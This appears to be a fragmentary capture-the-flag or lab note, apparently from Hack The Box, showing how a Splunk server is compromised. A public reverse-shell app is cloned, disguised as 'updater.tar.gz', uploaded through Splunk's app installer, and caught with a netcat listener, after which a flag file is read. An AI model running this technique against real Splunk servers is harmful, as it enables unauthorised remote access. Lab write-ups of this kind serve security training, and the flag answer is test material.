...
```shell-session
AIceBear@htb[/htb]$ tree splunk_shell/
...
```shell-session
AIceBear@htb[/htb]$ cat inputs.conf 
...
```shell-session
AIceBear@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/
...
```shell-session
AIceBear@htb[/htb]$ sudo nc -lnvp 443
...
<pre class="language-bash"><code class="lang-bash">#https://github.com/0xjpuff/reverse_shell_splunk
git clone https://github.com/0xjpuff/reverse_shell_splunk
#dont forget to edit ip &#x26; port in /bin folder
tar -cvzf updater.tar.gz splunk_shell/
#now upload it in manage apps -> install app from file
nc -nvlp 8443
#got revese shell
whoami
<strong>type c:\loot\flag.txt
</strong>l00k_ma_no_AutH!
</code></pre>
